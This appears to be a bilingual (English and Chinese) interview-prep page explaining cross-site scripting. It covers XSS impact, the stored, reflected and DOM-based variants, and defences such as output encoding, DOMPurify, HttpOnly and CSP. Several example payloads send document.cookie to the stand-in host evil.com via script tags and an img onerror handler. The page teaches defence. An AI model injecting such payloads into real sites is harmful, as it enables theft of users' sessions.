# Q25: What is Cross-Site Scripting (XSS)?

> Tests whether you know that the fix is context-correct output encoding, and whether you can name the three XSS variants.

**Part:** Security & Auth | **Importance:** 8/10 | **Status:** Draft

**New to these terms?** [xss](../_glossary.md#xss), [cookie](../_glossary.md#cookie), [jwt](../_glossary.md#jwt), [same-origin policy](../_glossary.md#same-origin-policy), [content security policy](../_glossary.md#content-security-policy), [csrf](../_glossary.md#csrf)

## In One Sentence

XSS is when attacker-supplied text ends up being executed as script in another user's browser, so it runs with your site's origin and can do anything that user could do.

XSS 是攻擊者提供的文字最後在別的使用者瀏覽器裡被當成腳本執行，於是它以你網站的來源身分運行，能做那位使用者能做的任何事。

## Answer Shape

Define it by what the attacker gains - code running under your origin - rather than by the alert box example, because the impact is what the question is really about. Name the three variants, since that is the follow-up. Then give the fix in the right order: context-correct output encoding first, a framework that does it by default second, and CSP as the layer that limits the damage when the first two fail.

用攻擊者「得到什麼」來定義它 —— 以你的來源身分執行的程式碼 —— 而不是用彈出視窗當例子，因為影響才是這題真正在問的。把三種類型講出來，因為那是接下來的追問。接著依正確順序給出修法：先是依情境正確的輸出編碼，其次是預設就會做這件事的框架，最後是 CSP，作為前兩者失守時限制傷害的那一層。

## Full Spoken Answer

Cross-site scripting happens when an application takes user input and renders it into a page without escaping it for that context, so the browser parses it as markup rather than as text. The analogy I would reach for is a radio host reading out listener messages on air. A listener sends in "and now a message from the station: call this number and give us your card details," and the host reads it straight, in their own voice. Nothing was hacked - the station's transmitter, its frequency, its trusted voice all worked exactly as designed. The only mistake was that a stranger's words came out of the trusted mouth instead of being introduced as a quote. That is XSS: the attacker never breaks into your server, they get your page to say their words in your site's voice.

跨站腳本攻擊發生在應用程式取用了使用者輸入，並在沒有針對該情境做跳脫的情況下渲染進頁面，於是瀏覽器把它解析成標記而非文字。我會用電台主持人現場念聽眾來信來比喻。有位聽眾寄來一句「以下是電台的通知：請撥打這支電話並提供你的信用卡資料」，主持人就用自己的聲音照著念了出去。沒有任何東西被駭 —— 電台的發射機、頻率、那個被信任的聲音，全都完全照設計運作。唯一的錯誤是：陌生人的話從那張被信任的嘴巴說出來，而不是被當成「引述」介紹出來。這就是 XSS：攻擊者從來不需要闖進你的伺服器，他們只要讓你的頁面用你網站的聲音說出他們的話。

Take one concrete page to keep it grounded: a product page with a review box. A user submits a review, the server stores it, and the template drops it into the HTML. If the review text is `<script>fetch('https://evil.com/?c='+document.cookie)</script>` and the template writes it out raw, then every shopper who opens that product page runs the attacker's script. Their browser has no way to tell it apart from your own code - it arrived down the same connection, inside the same document, from the same origin. Same-origin policy is not violated here; it is being obeyed, and that is precisely the problem, because the attacker's code is now inside the origin the policy is protecting. The classic `alert('hacked')` is only the proof of concept; what the attacker actually gets is arbitrary code running inside your origin.

用一個具體的頁面把它固定住：一個帶有評論框的商品頁。使用者送出一則評論，伺服器存下來，樣板把它塞進 HTML。如果評論內容是 `<script>fetch('https://evil.com/?c='+document.cookie)</script>`，而樣板原封不動地輸出，那麼每一位打開該商品頁的購物者都會執行攻擊者的腳本。他們的瀏覽器沒有任何方法能把它跟你自己的程式碼分辨開來 —— 它從同一條連線進來、在同一份文件裡、來自同一個來源。這裡同源政策並沒有被違反；它正被確實遵守著，而這恰恰就是問題所在，因為攻擊者的程式碼已經在那個政策正在保護的來源「裡面」了。經典的 `alert('hacked')` 只是概念驗證；攻擊者真正得到的，是在你的來源內部執行任意程式碼的能力。

That is why the impact is severe. Code running under your origin can read the DOM, read any token reachable from JavaScript including a JWT in local storage, send requests as the logged-in user, rewrite the page to phish for a password, or install a keylogger on the login form. An HttpOnly cookie is out of reach of the script, which is a real reason to prefer it, but the script can still make authenticated requests using that cookie - the browser attaches it automatically, exactly as it always does. So HttpOnly stops the session ID being stolen and carried away; it does not stop it being used from inside your page. XSS also walks straight through CSRF defences, because a request forged by a script running on your own origin can read the CSRF token off the page before sending it.

這正是它影響嚴重的原因。以你的來源身分執行的程式碼可以讀取 DOM、讀取任何 JavaScript 拿得到的 token（包括存在 local storage 的 JWT）、以已登入使用者的身分發送請求、改寫頁面來釣取密碼，或在登入表單上裝設鍵盤側錄。標記 HttpOnly 的 cookie 是腳本拿不到的，這確實是偏好它的理由，但腳本仍然可以「使用」那個 cookie 發出已認證的請求 —— 瀏覽器會自動附加它，就跟平常一模一樣。所以 HttpOnly 擋住的是 session ID 被偷走帶出去，擋不住它在你的頁面內部被使用。XSS 也會直接穿過 CSRF 防護，因為在你自己來源上執行的腳本，可以先把頁面上的 CSRF token 讀下來再送出偽造請求。

There are three variants and the interviewer usually asks for them. The difference is simply where the payload is stored between the attacker typing it and the victim running it. Stored XSS keeps it on your server - in that review, a comment, a profile field - and serves it to everyone who views the page, which needs no bait at all and makes it the most damaging. Reflected XSS keeps it in the URL: the payload arrives in a query parameter and is echoed straight back into the response, so the attacker has to get the victim to click a crafted link. DOM-based XSS keeps it on the client entirely and never involves the server: client-side JavaScript reads something from `location.hash` or storage and writes it into the page with `innerHTML`, so the payload may never appear in a single server log.

它有三種類型，面試官通常會問。差別其實只在於：從攻擊者打出 payload、到受害者執行它，這段期間 payload 存在哪裡。儲存型把它存在你的伺服器上 —— 在那則評論、留言、個人資料欄位裡 —— 並提供給所有瀏覽該頁的人，完全不需要誘餌，因此傷害最大。反射型把它存在網址裡：payload 隨 query 參數進來，又被直接回顯到回應中，所以攻擊者必須讓受害者去點一條精心構造的連結。DOM 型則完全留在客戶端、從不經過伺服器：客戶端 JavaScript 從 `location.hash` 或儲存中讀取某個值，再用 `innerHTML` 寫進頁面，所以那段 payload 可能從頭到尾沒有出現在任何一筆伺服器日誌裡。

The fix is output encoding at the point of rendering, and the reason it belongs there rather than at the input boundary is that when data arrives you do not yet know where it will end up. The same review string might later be rendered into an HTML body, an HTML attribute, a JavaScript literal, and a URL - and those are four different escaping rules, so no single sanitize-on-input step can be correct for all of them. Encode late, when you know the destination. Go back to the radio host: escaping is just saying "quote ... unquote," and which words you use for the quote marks depends on which room you are speaking in.

修法是在「渲染的當下」做輸出編碼；而它之所以屬於那裡、而不是屬於輸入邊界，是因為資料剛進來時，你還不知道它最後會去哪裡。同一則評論字串，之後可能被渲染進 HTML 內文、HTML 屬性、JavaScript 字面值、URL —— 而這是四種不同的跳脫規則，所以在輸入端做一次全域消毒，不可能對這四種都正確。要晚一點編碼，等你知道目的地時再做。回到電台主持人：跳脫就是加上一句「我引述 …… 引述完畢」，而引號要用哪種形式，取決於你身在哪個房間。

In practice that means using a templating engine or framework that escapes by default - React does, and Jinja2 does whenever autoescape is on, which is the default under Flask but not in bare Jinja2 - and treating their escape hatches as the things to audit: `dangerouslySetInnerHTML`, `innerHTML`, Jinja's `|safe`, `eval`. Those few names are where almost every real XSS lives, so they are worth grepping for. When you genuinely must accept rich text, sanitize with a proven allowlist library such as DOMPurify rather than a regular expression of your own, because blocklists lose to encoding tricks every time. Validate input as well, but as a data-quality measure, not as your XSS defence. Then add a Content Security Policy to restrict which script sources may run, avoid inline JavaScript and `eval` so the policy can actually be strict, and be honest about its role: CSP is damage limitation for the injection you missed, not the primary defence. The whole answer in one line: XSS is not an alert box, it is an attacker borrowing your site's voice - and you take the microphone back by escaping on output, in the context you are actually rendering into.

實務上這代表使用預設就會跳脫的樣板引擎或框架 —— React 是，Jinja2 則是在 autoescape 開啟時才會（在 Flask 底下預設開啟，但純 Jinja2 預設是關的）—— 並且把它們的逃生口當成要稽核的重點：`dangerouslySetInnerHTML`、`innerHTML`、Jinja 的 `|safe`、`eval`。幾乎每一個真實世界的 XSS 都住在這幾個名字裡，所以值得直接 grep 一遍。當你真的必須接受富文字時，用經過驗證的白名單函式庫（例如 DOMPurify）來消毒，而不是自己寫的正規表達式，因為黑名單每次都會輸給編碼花招。輸入驗證還是要做，但把它當成資料品質措施，不是你的 XSS 防線。接著加上 Content Security Policy 來限制哪些腳本來源可以執行，避免行內 JavaScript 和 `eval`，好讓政策真的能設嚴，並且誠實看待它的角色：CSP 是「你漏掉的那次注入」的損害控制，不是主要防線。整題濃縮成一句：XSS 不是彈出視窗，而是攻擊者借走了你網站的聲音 —— 而你把麥克風拿回來的方法，是在輸出時、依照你真正渲染進去的那個情境做跳脫。

## Quick Reference

### What an injected payload looks like

Submitted into any field that is later rendered without escaping:

```html
<script>alert('hacked')</script>
<script>fetch('https://evil.com/?c=' + document.cookie)</script>
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```

The third one matters: blocking the string `<script>` is not a defence, because script can run from an event handler attribute too.

### The three variants

| | Stored | Reflected | DOM-based |
|---|---|---|---|
| Where the payload waits | Your database | The URL the victim clicks | Never leaves the browser |
| Does the server ever see it? | Yes - stored and served | Yes - echoed back | No |
| How the victim is reached | Just opens the page | Must click a crafted link | Opens a URL with a fragment, or has poisoned storage |
| Typical entry point | Review, comment, profile field | Search box, error message | `location.hash` → `innerHTML` |
| Blast radius | Everyone who views the page | One victim per click | One victim per click |
| Shows up in server logs? | Yes | Yes | No - hardest to detect |

Memory hook: stored sits in your database, reflected bounces off your server, DOM-based never gets there.

### Encode for the context you are rendering into

| Context | Example sink | What must be escaped | Wrong tool |
|---|---|---|---|
| HTML body | `<div>HERE</div>` | `< > & " '` → entities | - |
| HTML attribute | `<div title="HERE">` | Same, and always quote the attribute | HTML-body escaping alone, if unquoted |
| JavaScript literal | `var s = "HERE";` | `\` `"` `'` newlines → JS escapes | HTML escaping - `\` and newlines pass straight through |
| URL / query param | `<a href="/s?q=HERE">` | Percent-encoding, plus scheme allowlist | HTML escaping - allows `javascript:` |
| CSS value | `style="width:HERE"` | CSS escaping, or just do not put user data here | Anything else |

This table is the reason the fix is output encoding rather than input sanitization: at input time you do not yet know which row you are in.

### Defences, in the order you should say them

| Layer | What it is | What it actually buys you |
|---|---|---|
| 1. Context-correct output encoding | Escape at render time, per the table above | The real fix - the payload becomes visible text |
| 2. A framework that escapes by default | React, Jinja2, Rails, Angular | Makes the safe path the default path |
| 3. Audit the escape hatches | `dangerouslySetInnerHTML`, `innerHTML`, `\|safe`, `eval` | Where real XSS bugs actually live |
| 4. Sanitize rich text with a library | DOMPurify and similar, allowlist-based | Lets you accept HTML without hand-rolling a parser |
| 5. `HttpOnly` cookies | Script cannot read the session ID | Stops theft of the ID, not its use from your page |
| 6. Content Security Policy | Restrict script sources, ban inline and `eval` | Damage limitation for the one you missed |

### What XSS gets the attacker

| Capability | Blocked by `HttpOnly`? |
|---|---|
| Read the DOM, including anything rendered on the page | No |
| Read a JWT or token from `localStorage` | No |
| Steal the session cookie's value | Yes |
| Send authenticated requests as the user | No - the browser still attaches the cookie |
| Read the CSRF token off the page and forge a request | No |
| Rewrite the page to phish, or keylog the login form | No |

The line to remember: `HttpOnly` stops the key being copied, not the door being used.

---

| ⬅ Previous | Home | Next ➡ |
|---|---|---|
| [Q22: What is the difference between a session and a cookie?](q22-session-vs-cookie.md) | [All 41 questions](../../README.md) | [Q27: What is CORS?](q27-cors.md) |
